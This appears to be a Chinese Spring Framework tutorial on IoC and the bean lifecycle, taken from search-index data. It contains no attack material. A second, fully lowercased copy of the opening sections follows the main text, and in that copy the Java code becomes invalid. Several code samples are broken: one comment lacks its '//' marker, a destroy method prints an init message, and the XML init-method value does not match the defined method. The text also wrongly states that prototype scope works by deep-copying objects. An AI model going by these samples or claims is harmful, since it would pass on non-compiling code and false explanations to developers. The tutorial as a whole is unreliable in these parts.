}\n \n    // 实例化后置\n    @Override\n    public boolean postProcessAfterInstantiation(Object bean, String beanName) throws BeansException {\n        System.out.println("postProcessAfterInstantiation被调用了---------beanName:" + beanName);\n        //默认返回true，什么也不做，继续下一步\n        return true;\n    }\n    \n    // 属性修改\n    @Override\n    public PropertyValues postProcessPropertyValues(PropertyValues pvs, PropertyDescriptor[] pds, Object bean, String beanName) throws BeansException {\n        System.out.println("postProcessPropertyValues被调用了---------beanName:"+beanName);\n        // 此方法可对bean中的属性值进行、添加、修改、删除操作；\n        // 对属性值进行修改，如果postProcessAfterInstantiation方法返回false，该方法可能不会被调用，\n        return pvs;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n下面我们依次解释\n\n\n# 1、实例化前置\n\n实例化前置使用的是 InstantiationAwareBeanPostProcessor.postProcessBeforeInstantiation(Class<?> beanClass, String beanName) 方法，方法里有2个参数，分别是beanClass和beanName，顾名思义，就是对在对象实例化之前对bean对象的class信息进行修改或者扩展，以达到我们想要的功能，它的底层是动态代理AOP技术实现的；且是bean生命周期中最先执行的方法；\n\n返回非空：返回值是Object类型，这意味着我们可以返回任何类型的值，由于这个时候目标对象还未实例化，所以这个返回值可以用来代替原本该生成对象的目标对象的实例，也就是说，如果返回了非空的值，那么以后我们需要用到这个bean的时候，拿到的就现在返回的对象了，也就不会去走第二步去实例化对象了；\n\n返回空（null）值：默认也是返回null值的，那么就直接返回，接下来会调用doCreateBean方法来实例化对象；\n\n\n# 2、实例化对象\n\ndoCreateBean方法创建实例，用反射技术创建，这个没什么好说的，只是相当于new了一个对象出来而已，但需要注意的是，这个时候只是将对象实例化了，对象内的属性还未设置；\n\n\n# 3、实例化后置\n\n方法名称： InstantiationAwareBeanPostProcessor.postProcessAfterInstantiation(Object bean, String beanName)\n\n在目标对象实例化之后调用，这个时候对象已经被实例化，但是该实例的属性还未被设置，都是null。因为他的返回值是决定要不要调用postProcessPropertyValues方法中的一个因素(因为还有一个因素是mbd.getDependencyCheck());\n\n返回false ：如果该方法返回false，并且不需要check，那么postProcessPropertyValues就会被忽略不执行；\n\n返回true ： 如果返回true，postProcessPropertyValues就会被执行\n\n\n# 4、属性修改\n\n方法名称 ：InstantiationAwareBeanPostProcessor.PropertyValues postProcessPropertyValues(PropertyValues pvs, PropertyDescriptor[] pds, Object bean, String beanName)\n\n此方法可对属性值进行修改，修改范围包括添加、修改、删除操作；，如果实例化后置 postProcessAfterInstantiation() 方法返回false，那么该方法不会被调用；\n\n\n# 5、给用户属性赋值\n\n用户属性指的是用spring 的人自定义的bean对象属性，像 User、Student、Teacher 、UserService、IndexService 这类的对象都是自定义bean对象，第5步主要给这类属性进行赋值操作，使用的是  AbstractAutowireCapableBeanFactory.populateBean() 方法进行赋值；\n\n\n# 6、给容器属性赋值\n\n容器属性其实就是容器自带的属性，这些属性都是spring本来就有的；可以肯定的是，它们都是 Aware 接口的实现类，主要有以下实现类，我已经将它们的执行顺序都排列好了，\n\n\n\n我们先看看怎么用，然后再来讲解每个Aware的作用；上代码\n\npackage com.Spring.Boot.init.aware;\n \nimport org.springframework.beans.BeansException;\nimport org.springframework.beans.factory.BeanClassLoaderAware;\nimport org.springframework.beans.factory.BeanFactory;\nimport org.springframework.beans.factory.BeanFactoryAware;\nimport org.springframework.beans.factory.BeanNameAware;\nimport org.springframework.context.*;\nimport org.springframework.context.annotation.ImportAware;\nimport org.springframework.context.weaving.LoadTimeWeaverAware;\nimport org.springframework.core.env.Environment;\nimport org.springframework.core.io.ResourceLoader;\nimport org.springframework.core.type.AnnotationMetadata;\nimport org.springframework.instrument.classloading.LoadTimeWeaver;\nimport org.springframework.stereotype.Component;\nimport org.springframework.util.StringValueResolver;\nimport org.springframework.web.context.ServletContextAware;\nimport javax.servlet.ServletContext;\n \n@Component\npublic class AllAwareInterface  implements BeanNameAware, BeanClassLoaderAware,\n        BeanFactoryAware, EnvironmentAware, EmbeddedValueResolverAware,\n        ResourceLoaderAware, ApplicationEventPublisherAware, MessageSourceAware,\n        ApplicationContextAware, ServletContextAware, LoadTimeWeaverAware, ImportAware {\n \n    @Override\n    public void setBeanName(String name) {\n        // BeanNameAware作用：让Bean对Name有知觉\n        //这个方法只是简单的返回我们当前的beanName,听官方的意思是这个接口更多的使用在spring的框架代码中，实际开发环境应该不建议使用\n        System.out.println("1 我是 BeanNameAware 的 setBeanName 方法  ---参数：name，内容："+ name);\n    }\n    @Override\n    public void setBeanClassLoader(ClassLoader classLoader) {\n        System.out.println("2 我是 BeanClassLoaderAware 的 setBeanClassLoader 方法");\n    }\n    @Override\n    public void setBeanFactory(BeanFactory beanFactory) throws BeansException {\n        // 注意： 如果使用 @Configuration 注解的话，setBeanFactory方法会执行2次，\n        System.out.println("3 我是 BeanFactoryAware 的 setBeanFactory 方法");\n    }\n    @Override\n    public void setEnvironment(Environment environment) {\n        System.out.println("4 我是 EnvironmentAware 的 setEnvironment 方法");\n    }\n    @Override\n    public void setEmbeddedValueResolver(StringValueResolver stringValueResolver) {\n        System.out.println("5 我是 EmbeddedValueResolverAware 的 setEmbeddedValueResolver 方法");\n    }\n    @Override\n    public void setResourceLoader(ResourceLoader resourceLoader) {\n        System.out.println("6 我是 ResourceLoaderAware 的 setResourceLoader 方法");\n    }\n    @Override\n    public void setApplicationEventPublisher(ApplicationEventPublisher applicationEventPublisher) {\n        System.out.println("7 我是 ApplicationEventPublisherAware 的 setApplicationEventPublisher 方法");\n    }\n    @Override\n    public void setMessageSource(MessageSource messageSource) {\n        System.out.println("8 我是 MessageSourceAware 的 setMessageSource 方法");\n    }\n    @Override\n    public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {\n        System.out.println("9 我是 ApplicationContextAware 的 setApplicationContext 方法");\n    }\n    @Override\n    public void setServletContext(ServletContext servletContext) {\n        System.out.println("10 我是 ServletContextAware 的 setServletContext 方法");\n    }\n    @Override\n    public void setLoadTimeWeaver(LoadTimeWeaver loadTimeWeaver) {\n        //LoadTimeWeaver 简称LTW，LTW是AOP的一种实现方式，此方法是为了获取Aop织入的对象，使用的织入方式是：类加载期织入，\n        // 一般的aop都是运行期织入，就是在运行的时候才进行织入切面方法，但是LTW是在类加载前就被织入了，也就是class文件在jvm加载之前进行织入切面方法\n        // 只有在使用 @EnableLoadTimeWeaving 或者存在 LoadTimeWeaver 实现的 Bean 时才会调用，顺序也很靠后\n        System.out.println("11 我是 LoadTimeWeaverAware 的 setLoadTimeWeaver 方法");\n    }\n    @Override\n    public void setImportMetadata(AnnotationMetadata annotationMetadata) {\n        //只有被其他配置类 @Import(XX.class) 时才会调用，这个调用对 XX.class 中的所有 @Bean 来说顺序是第 1 的。\n        System.out.println("12 我是 ImportAware 的 setImportMetadata 方法");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n\n\n启动spring后的控制台打印的部分结果如下：\n\n\n\n可以看到它们的输出结果按照顺序依次排列打印出来了，这就是它的标准顺序了；接下来我们了解下它们的具体作用\n\n\n# 6.1  BeanNameAware.setBeanName()\n\n这个方法只是简单的返回我们当前的beanName,听官方的意思是这个接口更多的使用在spring的框架代码中，实际开发环境应该不建议使用\n\n\n# 6.2  BeanClassLoaderAware.setBeanClassLoader()\n\n获取Bean的类装载器，\n\n\n# 6.3 BeanFactoryAware.setBeanFactory()\n\n获取bean工厂，beanFactory让你可以不依赖注入方式，随意的读取IOC容器里面的对象，不过beanFactory本身还是要注入的。\n\n需要注意的是，一般情况下我们都用  @Component 注解，如果使用 @Configuration 注解的话，setBeanFactory方法会执行2次；\n\n\n# 6.4 EnvironmentAware.setEnvironment()\n\n实现了EnvironmentAware接口重写setEnvironment方法后，在工程启动时可以获得application.properties 、xml、yml 的配置文件配置的属性值。\n\n\n# 6.5  EmbeddedValueResolverAware.setEmbeddedValueResolver()\n\n通常我们使用@Value注解来获取properties 和 yml 文件中的值，每个类中都要使用@Value也很繁琐，实现EmbeddedValueResolverAware接口后就方便多了。用法也跟@Value一样，需要用${}包裹住；\n\n@Component   \npublic class PropertiesUtil implements EmbeddedValueResolverAware {\n \n\t@Override\n\tpublic void setEmbeddedValueResolver(StringValueResolver stringValueResolver) {   \n     System.out.println(stringValueResolver.resolveStringValue("${logging.file}"));\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 6.6 ResourceLoaderAware.setResourceLoader()\n\nSpring ResourceLoader为我们提供了一个统一的getResource()方法来通过资源路径检索外部资源。从而将资源或文件(例如文本文件、XML文件、属性文件或图像文件)加载到Spring应用程序上下文中的不同实现 ，其实说白了，就是用来加载外部资源的；方法中有个参数：ResourceLoader ，这个参数其实就是ApplicationContext（spring 的上下文对象）；可直接强转；\n\npackage org.crazyit.app.service;\nimport org.springframework.context.ResourceLoaderAware;\nimport org.springframework.core.io.ResourceLoader;\npublic class TestBean implements ResourceLoaderAware{\n   \n    public void setResourceLoader(ResourceLoader resourceLoader) {\n        // 可直接强转为 ApplicationContext\n        ApplicationContext context = (ApplicationContext) resourceLoader;\n \n        System.out.println("6 我是 ResourceLoaderAware 的 setResourceLoader 方法");\n    }\n   \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n并且我们可以指定不同的前缀来创建路径以从不同位置加载资源\n\n\n\n\n# 6.7 ApplicationEventPublisherAware.setApplicationEventPublisher()；\n\nApplicationEventPublisherAware是一个事件发布器的接口，使用这个接口，我们自己的 Service 就拥有了发布事件的能力。用户注册后，不再是显示调用其他的业务 Service，而是发布一个用户注册事件。那么在这里是发布事件，那就肯定有监听事件的接口，这个接口叫做 ApplicationListener <E extends ApplicationEvent > ，只要实现 ApplicationListener 接口就可以接受发布的事件了，接下来我们写一个示例来模拟发布事件和监听事件；\n\n先创建一个实体类，用来存储发布的事件内容   StringEvent.java\n\npackage com.Spring.Boot.init.listener.eventModel;\nimport org.springframework.context.ApplicationEvent;\n//事件监听对象\npublic class StringEvent extends ApplicationEvent {\n \n    private String str;\n    // 构造函数\n    public StringEvent(Object source) {\n        super(source);\n        str = source.toString();\n    }\n    // 获取字符串\n    public String getStr(){\n        return str;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n创建一个发布事件的类：ExtApplicationEventPublisherAware.java ，实现 ApplicationEventPublisherAware  接口增加发布事件的功能；\n\npackage com.Spring.Boot.init.aware;\n \nimport com.Spring.Boot.init.listener.eventModel.StringEvent;\nimport org.springframework.context.ApplicationEventPublisher;\nimport org.springframework.context.ApplicationEventPublisherAware;\nimport org.springframework.stereotype.Component;\n \n/**\n * 发布事件\n */\n@Component\npublic class ExtApplicationEventPublisherAware implements ApplicationEventPublisherAware {\n    @Override\n    public void setApplicationEventPublisher(ApplicationEventPublisher applicationEventPublisher) {\n        System.out.println("发布事件，事件对象为 StringEvent ，内容为 ：1234");\n        StringEvent stringEvent = new StringEvent("1234");\n        // 发布事件 ，发布后会在 ApplicationListener.onApplicationEvent()方法进行捕获；\n        applicationEventPublisher.publishEvent(stringEvent);  // 发布事件\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n在创建一个事件监听器：  EventListener.java ，用来监听所有发布的事件；\n\npackage com.Spring.Boot.init.listener;\n \n \nimport com.Spring.Boot.init.listener.eventModel.StringEvent;\nimport org.springframework.context.ApplicationEvent;\nimport org.springframework.context.ApplicationListener;\nimport org.springframework.stereotype.Component;\n \n//事件监听器\n@Component\npublic class EventListener implements ApplicationListener<StringEvent> {\n \n    @Override\n    public void onApplicationEvent(StringEvent o) {\n        System.out.println("监听到事件，内容："+o.getStr());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n接下来，运行spring项目，看看打印的结果如下，到这里，事件的发布和监听就完成了；\n\n\n\n\n# 6.8 MessageSourceAware.setMessageSource()\n\n国际化消息通知操作\n\n\n# 6.9 ApplicationContextAware.setApplicationContext()\n\nApplicationContextAware 主要用来全局获取 ApplicationContext 上下文，ApplicationContext其实就是容器，为此我们可以实现 ApplicationContextAware 接口来获取ApplicationContext容器对象；我们可以把它做成一个公共的静态类，这样可以在任意地方想拿就拿了，\n\npackage com.Spring.Boot.init.aware;\n \nimport org.springframework.beans.BeansException;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.ApplicationContextAware;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.stereotype.Component;\n \n@Component\npublic class ExtApplicationContextAware implements ApplicationContextAware {\n \n    /**\n     * Spring容器会在加载完Spring容器后调用ApplicationContextAware.setApplicationContext方法\n     * ApplicationContextAware 主要用来全局获取 ApplicationContext 上下文，\n     */\n \n    private static ApplicationContext applicationContext;\n \n    @Override\n    public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {\n        if (ExtApplicationContextAware.applicationContext == null) {\n            ExtApplicationContextAware.applicationContext = applicationContext;\n        }\n        System.out.println("========ApplicationContext配置成功========");\n        System.out.println("========在普通类可以通过调用SpringBootBeanUtil.getApplicationContext()获取applicationContext对象========");\n        System.out.println("========applicationContext="+ ExtApplicationContextAware.applicationContext +"========");\n    }\n \n    /**\n     * 获取applicationContext\n     * @return\n     */\n    public static ApplicationContext getApplicationContext() {\n        return applicationContext;\n    }\n \n    /**\n     * 通过name获取 Bean.\n     * @param name\n     * @return\n     */\n    public static Object getBean(String name) {\n        return getApplicationContext().getBean(name);\n    }\n \n    /**\n     * 通过class获取Bean.\n     * @param clazz\n     * @return\n     */\n    public static <T> T getBean(Class<T> clazz) {\n        return getApplicationContext().getBean(clazz);\n    }\n \n    /**\n     * 通过name,以及Clazz返回指定的Bean\n     * @param name\n     * @param clazz\n     * @return\n     */\n    public static <T> T getBean(String name, Class<T> clazz) {\n        return getApplicationContext().getBean(name, clazz);\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n当然，也可以直接注入，就像这样：\n\n @Autowired\n private ApplicationContext applicationContext;\n\n\n1\n2\n\n\n\n# 6.10 ServletContextAware.setServletContext()\n\n通过实现ServletContextAware接口可获取servletContext，也就是servlet的上下文；\n\n什么是ServletContext ： WEB容器在启动时，它会为每个WEB应用程序都创建一个对应的ServletContext对象，它代表当前web应用。ServletConfig对象中维护了ServletContext对象的引用，开发人员在编写servlet时，可以通过ServletConfig.getServletContext方法获得ServletContext对象。 由于一个WEB应用中的所有Servlet共享同一个ServletContext对象，因此Servlet对象之间可以通过ServletContext对象来实现通讯。ServletContext对象通常也被称之为context域对象。\n\n\n# 6.11 LoadTimeWeaverAware.setLoadTimeWeaver()\n\n其实在调试的时候还有2个没打印出来，第11个就是 LoadTimeWeaver， 简称LTW，LTW是AOP的一种实现方式，此方法是为了获取Aop织入的对象，使用的织入方式是：类加载期织入， 一般的aop都是运行期织入，就是在运行的时候才进行织入切面方法，但是LTW是在类加载前就被织入了，也就是class文件在jvm加载之前进行织入切面方法 只有在使用 @EnableLoadTimeWeaving 或者存在 LoadTimeWeaver 实现的 Bean 时才会调用，顺序也很靠后;\n\n\n# 6.12  ImportAware.setImportMetadata()\n\n还有一个没打印的就是ImportAware接口，这个接口的方法只有被其他配置类 @Import(XX.class) 时才会调用，这个调用对 XX.class 中的所有 @Bean 来说顺序是第 1 的。\n\n\n# 7、初始化前置\n\n方法名称： BeanPostProcessor.postProcessBeforeInitialization()\n\n在每一个 Bean 初始化之前执行的方法（有多少 Bean 调用多少次）\n\n注意 ： 启用该方法后，标注了@PostConstruct注解的方法会失效\n\n\n# 8、初始化后置\n\n方法名称： BeanPostProcessor.postProcessAfterInitialization()\n\n在每一个 Bean 初始化之后执行的方法（有多少 Bean 调用多少次）\n\n初始化前置和初始化后置的实现代码如下\n\npackage com.Spring.Boot.init;\nimport org.springframework.beans.BeansException;\nimport org.springframework.beans.factory.config.BeanPostProcessor;\nimport org.springframework.stereotype.Component;\n \n@Component\npublic class ExtBeanPostProcessor implements BeanPostProcessor {\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {\n        // 在每一个 Bean 初始化之前执行的方法（有多少 Bean 调用多少次）\n        // 注意 ： 启用该方法后，标注了@PostConstruct注解的方法会失效\n        System.out.println("初始化前置方法");\n        return null;\n    }\n    @Override\n    public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException {\n         在每一个 Bean 初始化之后执行的方法（有多少 Bean 调用多少次）\n        System.out.println("初始化后置方法");\n        return null;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 9、执行初始化方法\n\n初始化方法有三个，分别是 添加了@PostConstruct 注解的方法、实现InitializingBean接口、在@bean注解上添加 initMethod属性；我们一个个讲\n\n\n# 9.1 初始化方法一：@PostConstruct\n\n在bean对象内添加@PostConstruct 注解后即可实现初始化的功能，被@PostConstruct修饰的方法会在构造函数之后，init()方法之前运行。 有多个则会执行多次；\n\n注意： 如果spring 实现了 BeanPostProcessor接口的postProcessBeforeInitialization() 方法，也就是12的初始后置方法，那么@PostConstruct注解会失效；\n\n代码示例\n\npackage com.Spring.Boot.init;\nimport org.springframework.stereotype.Component;\nimport javax.annotation.PostConstruct;\n \n// @PostConstruct注解\n@Component\npublic class ExtPostConstruct {\n \n    /**\n     * 被@PostConstruct修饰的方法会在构造函数之后，init()方法之前运行。如果有多个则会执行多次\n     * 注意： 如果spring 实现了 BeanPostProcessor接口的postProcessBeforeInitialization方法，该@PostConstruct注解会失效\n     */\n    @PostConstruct\n    public void init() {\n        System.out.println("第一个init...");\n    }\n \n    // 有多个会执行多次\n    @PostConstruct\n    public void init1() {\n        System.out.println("第二个init1...");\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 9.2 InitializingBean.afterPropertiesSet()\n\nspring 初始化方法之一，作用是在BeanFactory完成属性设置之后,执行自定义的初始化行为。\n\n执行顺序：在initMethod之前执行，在@PostConstruct之后执行\n\n代码示例\n\npackage com.Spring.Boot.init;\nimport org.springframework.beans.factory.InitializingBean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.stereotype.Component;\n \n@Component\npublic class ExtInitializingBean implements InitializingBean {\n    @Override\n    public void afterPropertiesSet() throws Exception {\n        // 一个 InitializingBean 执行一次\n        // spring 初始化方法，作用是在BeanFactory完成属性设置之后,执行自定义的  初始化行为.\n        // 执行顺序：在initMethod之前执行，在@PostConstruct之后执行\n        System.out.println("InitializingBean");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 9.3 init-method\n\nbean 配置文件属性 init-method 用于在bean初始化时指定执行方法，用来替代继承 InitializingBean接口,\n\n注意的一点是只有一个类完整的实例被创建出来后，才能走初始化方法。\n\n示例代码，先定义一个类： BeanTest.java ，在类中定义一个初始化方法 initMethod_1()\n\npackage com.Spring.Boot.init.bean;\n \npublic class BeanTest {\n    \n    // 将要执行的初始化方法\n    public void initMethod_1(){\n        System.out.println("我是beanTest的init方法");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nxml 配置方式\n\n<bean id="beanTest" class="com.BeanTest" init-method="init"></bean> \n\n\n1\n\n\n注解配置方式\n\npackage com.Spring.Boot.init;\nimport com.Spring.Boot.init.bean.BeanTest;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.stereotype.Component;\n@Component()\npublic class InitMethod  {\n    \n    // 在@Bean注解上添加initMethod属性，指向类中的 initMethod_1 执行初始化方法\n    @Bean(initMethod = "initMethod_1")\n    public BeanTest getBeanTest(){\n        return new BeanTest();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 10、使用中\n\n到这一步，bean对象就已经完全创建好了，是一个完整对象了，并且正在被其他对象使用了；\n\n\n# 11、销毁流程\n\n在这里需要先说一下，被spring容器管理的bean默认是单例的，默认在类上面有个 @Scope注解，也就是这样的\n\npackage com.Spring.Boot.init;\n \nimport org.springframework.beans.factory.config.ConfigurableBeanFactory;\nimport org.springframework.context.annotation.Scope;\nimport org.springframework.stereotype.Component;\n \n@Component()\n@Scope(value = ConfigurableBeanFactory.SCOPE_SINGLETON)\n// @Scope(value = "singleton")  // 也可以这样写\npublic class InitMethod  {\n \n  // methods....\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n如果要设置成多例，只需要把@Scope的属性值改一下就行，就像这样，多例模式也叫原型模式，它底层不是重新创建一个bean对象出来，而是使用深拷贝技术实现的，就是复制一个对象出来进行使用\n\n@Scope(value = ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n// @Scope(value = "prototype") // 也可以这样写\n\n\n1\n2\n\n\n为什么要介绍单例和多例呢？ 因为啊，销毁流程的走向就跟你是单例还是多例有关；\n\n如果是单例模式，会先执行 DisposableBean.destroy()方法，然后在执行 destroy-Method 方法；\n\n\n# 11.1  DisposableBean.destroy()\n\n单例模式的销毁方式，示例代码\n\npackage com.Spring.Boot.init.destroy;\n \nimport org.springframework.beans.factory.DisposableBean;\nimport org.springframework.stereotype.Component;\n \n/**\n * 销毁方法\n */\n@Component\npublic class ExtDisposableBean implements DisposableBean {\n    @Override\n    public void destroy() throws Exception {\n        System.out.println("我被销毁了");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n当结束main方法时，控制台打印的结果如下\n\n\n# 11.2  destory-method方法\n\n还是拿 第11 个流程的例子来讲，只不过这次我们在@Bean注解里加上 destroyMethod属性，指向销毁方法 ：destroyMethod_1()\n\npackage com.Spring.Boot.init;\n \nimport com.Spring.Boot.init.bean.BeanTest;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.stereotype.Component;\n \n@Component()\npublic class InitMethod  {\n \n    // 在@Bean注解上添加initMethod属性，指向类中的 initMethod_1 执行初始化方法\n    // 在@Bean注解上添加destroyMethod属性，指向类中的 destroyMethod_1 执行销毁方法\n    @Bean(initMethod = "initMethod_1",destroyMethod = "destroyMethod_1")\n    public BeanTest getBeanTest(){\n        return new BeanTest();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nBeanTest.java\n\npackage com.Spring.Boot.init.bean;\n \npublic class BeanTest {\n \n    // 将要执行的初始化方法\n    public void initMethod_1(){\n        System.out.println("我是beanTest的init方法");\n    }\n \n    // 将要执行的销毁方法\n    public void destroyMethod_1(){\n        System.out.println("我是beanTest的init方法");\n    }\n \n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nxml的配置方式\n\n<bean id="beanTest" class="com.BeanTest" destroy-method="destroyMethod_1"></bean>\n\n\n\n1\n2\n\n\n\n# 12、返回bean给用户，剩下的生命周期由用户控制\n\n因为多例模式下，spring无法进行管理，所以将生命周期交给用户控制，用户用完bean对象后，java垃圾处理器会自动将无用的对象进行回收操作；',normalizedContent:'# spring ioc\n\n首先，在此之前，我们就必须先知道什么是ioc，ioc叫做控制反转，也可以称为依赖注入（di），实际上依赖注入是ioc的另一种说法，\n\n 1. 谁控制谁？：在以前，对象的创建和销毁都是由用户控制的，用了ioc之后，对象的创建和销毁就都交给容器来控制了，用户就不用管这些，只关注业务需求就好了；\n\n 2. 什么是反转？：既然叫反转，肯定就有正转，正转其实就是对象去找实例，而反转就反过来了嘛，让实例来找对象；怎么找呢？当然是通过容器啦！\n    \n    \n\n 3. 谁依赖谁？：在spring项目中，将对象理解为bean，也可以叫bean对象，这个bean和容器之间有个依赖关系，bean对象的创建是依赖容器的，就好像孩子依赖父母一样，孩子不能自己生出自己，需要父母的合作才能出生，这里的孩子就是bean，父母就是容器；\n\n 4. 谁注入谁？：通过容器注入了bean对象，而且这个过程是自动化的，也就是说容器会自动找到和bean对象匹配的类型实例注入到对象中；\n\n\n# spring ioc的加载过程\n\n了解完控制反转和依赖注入，接下来我们在看看ioc的加载过程，ioc的整个加载过程如下图，先看看大致的流程，然后再慢慢深入 （其中黄色的框内是注释内容）\n\n\n\n1、首先，通过beandefinitionreader 读取指定的配置文件生成bean的定义信息，然后到完整的bean定义信息(beandefinition对象)，注意这里只是存储bean的定义信息，还没有实例化bean对象；就像工厂里面一样，原材料已经准备好了，但是还没有进行生产，原材料就是beandefinition，生产就是实例化\n\n2、在 beandefinition 和 完整beandefinition 中间通过一个后置增强器，可以对bean的定义信息进行统一修改，只需要实现 beanfactorypostprocessor 接口即可，这个后置增强器是可以有多个的，你只要在不同的类实现多个 beanfactorypostprocessor 接口就会执行多次，就像这样：\n\npackage com.spring.boot.init;\nimport org.springframework.beans.beansexception;\nimport org.springframework.beans.factory.config.beanfactorypostprocessor;\nimport org.springframework.beans.factory.config.configurablelistablebeanfactory;\nimport org.springframework.stereotype.component;\n/**\n * 扩展方法--后置增强器（可修改bean的定义信息）\n */\n@component\npublic class extbeanfactorypostprocessor implements beanfactorypostprocessor {\n    @override\n    public void postprocessbeanfactory(configurablelistablebeanfactory beanfactory) throws beansexception {\n//        beandefinition studentservice = beanfactory.getbeandefinition("studentservice");\n        system.out.println("扩展方法--可进行修改beandefinition的定义信息");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n3、得到 完整beandefinition 之后就可以进行创建对象了，这整个过程被称为 bean 的生命周期，也就是从实例化到销毁的过程；那么这时候爱学习童鞋就要发问了：“对象创建和销毁有这么麻烦嘛？直接反射实例化一个对象不就行了嘛？为啥还有初始化？”； 首先，这是个好问题，来，我们先把掌声送给这位发问的同学；我想说的是，就算是普通的new一个对象出来，里面也会经过实例化和初始化，有兴趣的话请看我的另一篇文章 ： java创建对象过程 实例化和初始化； 接下来我们重点讲bean的生命周期;\n\n\n# spring bean的生命周期\n\n粗略来看，bean的生命周期主要分为以下4个步骤\n\n\n\n但其实，它的内部蕴含了很多东西，让我们看看细化后的流程图；\n\n\n\n怎么样？ 是不是看到了很多没见过的东西？好像认识几个，但大多都是没见过的东东，不知道不要紧，接下来我们一个个地讲解\n\n接下来我们要将1、3、4 放到一起讲，是因为它们是在同一个接口里面的，实现 instantiationawarebeanpostprocessor 接口即可\n\npackage com.spring.boot.init;\n \nimport org.springframework.beans.beansexception;\nimport org.springframework.beans.factory.config.instantiationawarebeanpostprocessor;\nimport org.springframework.stereotype.component;\n \n@component\npublic class myinstantiationawarebeanpostprocessor implements instantiationawarebeanpostprocessor {\n \n    // 实例化前置\n    @override\n    public object postprocessbeforeinstantiation(class<?> beanclass, string beanname) throws beansexception {\n        \n        system.out.println("postprocessbeforeinstantiation被调用了----在对象实例化之前调用-----beanname:" + beanname);\n        // 默认什么都不做，返回null\n        return null;\n    }\n \n    // 实例化后置\n    @override\n    public boolean postprocessafterinstantiation(object bean, string beanname) throws beansexception {\n        system.out.println("postprocessafterinstantiation被调用了---------beanname:" + beanname);\n        //默认返回true，什么也不做，继续下一步\n        return true;\n    }\n    \n    // 属性修改\n    @override\n    public propertyvalues postprocesspropertyvalues(propertyvalues pvs, propertydescriptor[] pds, object bean, string beanname) throws beansexception {\n        system.out.println("postprocesspropertyvalues被调用了---------beanname:"+beanname);\n        // 此方法可对bean中的属性值进行、添加、修改、删除操作；\n        // 对属性值进行修改，如果postprocessafterinstantiation方法返回false，该方法可能不会被调用，\n        return pvs;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n下面我们依次解释\n\n\n# 1、实例化前置\n\n实例化前置使用的是 instantiationawarebeanpostprocessor.postprocessbeforeinstantiation(class<?> beanclass, string beanname) 方法，方法里有2个参数，分别是beanclass和beanname，顾名思义，就是对在对象实例化之前对bean对象的class信息进行修改或者扩展，以达到我们想要的功能，它的底层是动态代理aop技术实现的；且是bean生命周期中最先执行的方法；\n\n返回非空：返回值是object类型，这意味着我们可以返回任何类型的值，由于这个时候目标对象还未实例化，所以这个返回值可以用来代替原本该生成对象的目标对象的实例，也就是说，如果返回了非空的值，那么以后我们需要用到这个bean的时候，拿到的就现在返回的对象了，也就不会去走第二步去实例化对象了；\n\n返回空（null）值：默认也是返回null值的，那么就直接返回，接下来会调用docreatebean方法来实例化对象；\n\n\n# 